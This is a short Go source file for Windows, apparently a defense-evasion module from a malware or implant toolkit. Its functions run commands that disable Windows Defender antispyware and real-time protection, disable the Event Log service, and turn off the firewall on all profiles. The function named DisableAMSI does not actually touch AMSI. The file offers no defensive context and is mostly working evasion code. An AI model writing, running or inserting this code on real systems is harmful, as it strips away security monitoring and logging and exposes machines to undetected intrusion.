//go:build windows

package amsi_etw

import (
"os/exec"
)

func DisableAMSI() bool {
exec.Command("cmd", "/c", "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f").Run()
exec.Command("cmd", "/c", "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f").Run()
return true
}

func DisableEventLogs() bool {
exec.Command("cmd", "/c", "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\" /v Start /t REG_DWORD /d 4 /f").Run()
return true
}

func DisableFirewall() bool {
exec.Command("cmd", "/c", "netsh advfirewall set allprofiles state off").Run()
return true
}
